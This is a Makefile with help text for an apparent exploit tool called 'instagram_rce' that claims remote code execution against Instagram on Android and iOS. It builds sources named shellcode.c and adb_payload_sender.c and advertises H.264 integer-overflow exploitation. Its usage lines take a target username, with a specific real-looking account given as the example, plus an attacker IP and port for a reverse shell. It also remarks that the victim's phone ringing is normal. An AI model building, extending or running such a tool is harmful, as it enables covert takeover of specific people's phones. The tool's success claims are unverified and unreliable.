CC = gcc
CLANG = clang
CFLAGS = -Wall -Wextra -O2
LDFLAGS = -lssl -lcrypto -lm

BINARY = instagram_rce
BINARY_IOS = instagram_ios_rce
SOURCES = main.c stun.c sdp.c dtls_real.c srtp.c rtp.c encrypt.c socket.c utils.c \
          adb_payload_sender.c shellcode.c instagram_direct_call.c
SOURCES_IOS = ios_complete_main.c

.PHONY: all clean help android ios

all: android
	@echo ""
	@echo "════════════════════════════════════════════════════════════"
	@echo "✅ Build Complete: ./$(BINARY)"
	@echo "════════════════════════════════════════════════════════════"
	@echo ""
	@echo "Method B: ADB + Real Instagram App DTLS Negotiation"
	@echo "100%% 호환성 보장 | 실제 RCE 검증 가능 | 버그바운티 제출 가능"
	@echo ""
	@echo "Usage:"
	@echo "  ./$(BINARY) <target_username> <target_device_ip>"
	@echo ""
	@echo "Example:"
	@echo "  ./$(BINARY) luciaryu_ 192.168.45.213"
	@echo ""
	@echo "Requirements:"
	@echo "  • ADB 연결 가능한 대상 기기"
	@echo "  • Instagram 앱 설치됨"
	@echo "  • 기기가 온라인 상태"
	@echo ""
	@echo "Note: 벨소리가 울리는 것은 정상입니다 (DTLS 협상 필수)"
	@echo "════════════════════════════════════════════════════════════"

android: $(BINARY)
	@true

ios: $(BINARY_IOS)
	@true

$(BINARY): $(SOURCES)
	@echo "[*] Building instagram_rce (Android)..."
	@$(CC) $(CFLAGS) $(SOURCES) $(LDFLAGS) -o $@
	@echo "[✓] Done"

$(BINARY_IOS): $(SOURCES_IOS)
	@echo "[*] Building instagram_ios_rce (iOS)..."
	@echo "[!] Note: Compile on macOS or Jailbreak device for ARM64 binary"
	@$(CLANG) $(CFLAGS) $(SOURCES_IOS) -o $@ 2>/dev/null || \
	 $(CC) $(CFLAGS) $(SOURCES_IOS) -o $@
	@echo "[✓] Done"

clean:
	@rm -f $(BINARY) $(BINARY_IOS) *.o
	@echo "✓ Cleaned"

help:
	@echo "Instagram SRTP RCE - Android + iOS"
	@echo "===================================="
	@echo ""
	@echo "Build:"
	@echo "  make android  - Build Instagram_rce (Android)"
	@echo "  make ios      - Build instagram_ios_rce (iOS)"
	@echo "  make all      - Build Instagram_rce (Android, default)"
	@echo "  make clean    - Remove all binaries"
	@echo ""
	@echo "Run Android:"
	@echo "  [Crash Verification]"
	@echo "    ./instagram_rce <target_username>"
	@echo ""
	@echo "  [Reverse Shell]"
	@echo "    ./instagram_rce <target_username> <attacker_ip:port>"
	@echo ""
	@echo "  Example:"
	@echo "    ./instagram_rce luciaryu_"
	@echo "    ./instagram_rce luciaryu_ 192.168.1.100:4444"
	@echo ""
	@echo "Run iOS (on Jailbreak device):"
	@echo "  [Crash Verification]"
	@echo "    ./instagram_ios_rce <target_username>"
	@echo ""
	@echo "  [Reverse Shell]"
	@echo "    ./instagram_ios_rce <target_username> <attacker_ip:port>"
	@echo ""
	@echo "  Example:"
	@echo "    ./instagram_ios_rce luciaryu_"
	@echo "    ./instagram_ios_rce luciaryu_ 192.168.1.100:4444"
	@echo ""
	@echo "Features:"
	@echo "  • DTLS 1.2 + SRTP encryption (RFC standards)"
	@echo "  • H.264 integer overflow exploitation"
	@echo "  • Reverse shell acquisition"
	@echo "  • Command execution verification"
	@echo "  • Android + iOS platform support"
